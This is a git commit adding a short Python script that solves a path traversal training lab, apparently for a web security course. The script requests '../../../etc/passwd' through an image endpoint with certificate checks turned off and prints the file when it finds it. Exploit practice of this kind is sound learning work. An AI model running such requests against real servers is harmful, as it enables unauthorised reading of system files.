b00590cb00cb87bfc7af96e8aa69dc6ab16f4413
Ryan <51466268+ryanrestine@users.noreply.github.com>
2026-06-17 11:43:17 -0500

    Created Path_Traversal folder and added traversal lab 01 solution and script

---
+++ Path_Traversal/Traversal_01_file_path_traversal_simple_case/traversal_01.py
@@ -0,0 +1,25 @@
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def traversal(s, url):
+    image_url = url + "/image?filename=../../../etc/passwd"
+    r = s.get(image_url, verify=False)
+    if "root:x:0:0" in r.text:
+        print("[+] Lab Solved.")
+        print(f"{r.text}")
+    else:
+        print("[-] Error accessing /etc/passwd file.")
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"[+] Usage: {sys.argv[0]} <url>")
+        sys.exit(0)
+
+    s = requests.Session()
+    url = sys.argv[1].strip()
+    traversal(s, url)
+
+if __name__=="__main__":
+    main()
